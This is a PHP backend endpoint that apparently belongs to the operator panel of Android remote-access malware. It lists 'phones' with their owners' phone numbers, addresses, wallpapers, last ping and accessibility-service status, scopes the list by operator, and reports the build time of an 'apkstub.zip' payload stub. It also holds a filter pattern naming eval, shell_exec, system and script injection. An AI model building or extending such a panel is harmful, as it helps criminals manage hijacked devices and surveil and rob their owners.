<?php
date_default_timezone_set('Asia/Shanghai');

require_once '../private/security_headers.php';
setSecurityHeaders();

try {
    $clientIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    rateLimitCheck('alldevices_' . $clientIp, 120, 60);

    $pdo = getDbConnection();
    $user = validateToken($pdo);

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input = json_decode(file_get_contents('php://input'), true);
        $page = isset($input['page']) ? max(1, (int)$input['page']) : 1;
        $pageSize = isset($input['pageSize']) ? min(100, max(1, (int)$input['pageSize'])) : 10;
        $offset = ($page - 1) * $pageSize;

        $isAdmin = (($user['authorty'] ?? '') === 'admin');
        $usrname = $user['usrname'];

        $whereSql = '';
        $params = [];

        if ($isAdmin) {
            $whereSql = 'WHERE 1 = 1';
        } else {
            $whereSql = 'WHERE usrname = :usrname AND phoneopen = 1';
            $params[':usrname'] = $usrname;
        }

        if (!empty($input['usrname'])) {
            $whereSql .= ' AND usrname LIKE :usrnameSearch';
            $params[':usrnameSearch'] = '%' . addcslashes($input['usrname'], '%_\\') . '%';
        }
        if (!empty($input['phone_name'])) {
            $whereSql .= ' AND phone_name LIKE :phone_name';
            $params[':phone_name'] = '%' . addcslashes($input['phone_name'], '%_\\') . '%';
        }
        if (!empty($input['country'])) {
            $whereSql .= ' AND country LIKE :country';
            $params[':country'] = '%' . addcslashes($input['country'], '%_\\') . '%';
        }
        if (!empty($input['model'])) {
            $whereSql .= ' AND model LIKE :model';
            $params[':model'] = '%' . addcslashes($input['model'], '%_\\') . '%';
        }
        if (isset($input['accessibility']) && $input['accessibility'] !== '') {
            $whereSql .= ' AND accessibility = :accessibility';
            $params[':accessibility'] = $input['accessibility'];
        }
        if (!empty($input['install_date'])) {
            $whereSql .= ' AND install_date LIKE :install_date';
            $params[':install_date'] = '%' . addcslashes($input['install_date'], '%_\\') . '%';
        }

        $totalSql = "SELECT COUNT(*) FROM phones $whereSql";
        $totalStmt = $pdo->prepare($totalSql);
        foreach ($params as $key => $val) {
            $totalStmt->bindValue($key, $val);
        }
        $totalStmt->execute();
        $total = (int)$totalStmt->fetchColumn();
        $pageCount = ceil($total / $pageSize);

        $sql = "
            SELECT 
                phone_id, usrname, phone_name, android_ver, model, wallpaper, 
                phonenumber, battery_charg, network, install_date, 
                last_ping, address, country, phoneopen, activities, accessibility
            FROM phones
            $whereSql
            ORDER BY install_date DESC, phone_id ASC
            LIMIT :limit OFFSET :offset
        ";
        $stmt = $pdo->prepare($sql);
        foreach ($params as $key => $val) {
            $stmt->bindValue($key, $val);
        }
        $stmt->bindValue(':limit', $pageSize, PDO::PARAM_INT);
        $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
        $stmt->execute();
        $phones = $stmt->fetchAll(PDO::FETCH_ASSOC);

        foreach ($phones as &$phone) {
            if (isset($phone['wallpaper']) && isBase64Image($phone['wallpaper'])) {
                $phone['wallpaper'] = 'data:image/jpeg;base64,' . $phone['wallpaper'];
            } else {
                $phone['wallpaper'] = '';
            }
        }

        $apkStubPath = defined('APK_STUB_PATH') ? APK_STUB_PATH : (APP_BASE_PATH . '/private/apkstub/apkstub.zip');
        $fileLastModified = null;
        if (file_exists($apkStubPath)) {
            $fileLastModified = date("Y-m-d H:i:s", filemtime($apkStubPath));
        }

        echo json_encode([
            'data' => $phones,
            'total' => $total,
            'pageCount' => $pageCount,
            'fileLastModified' => $fileLastModified
        ]);
    } else {
        http_response_code(405);
        echo json_encode(['error' => 'Invalid request method.']);
    }
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Database error']);
    error_log('[AllDevices] ' . $e->getMessage());
}

function isBase64Image($str) {
    if (empty($str) || $str === '-1') return false;
    if (strlen($str) > 5 * 1024 * 1024) return false;
    if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $str)) return false;
    if (strlen($str) % 4 !== 0) return false;

    $decoded = base64_decode($str, true);
    if ($decoded === false) return false;

    if (preg_match('/<\?php|eval\s*\(|shell_exec|system\s*\(|exec\s*\(|passthru|base64_decode\s*\(|<script/i', $decoded)) {
        return false;
    }
    return true;
}
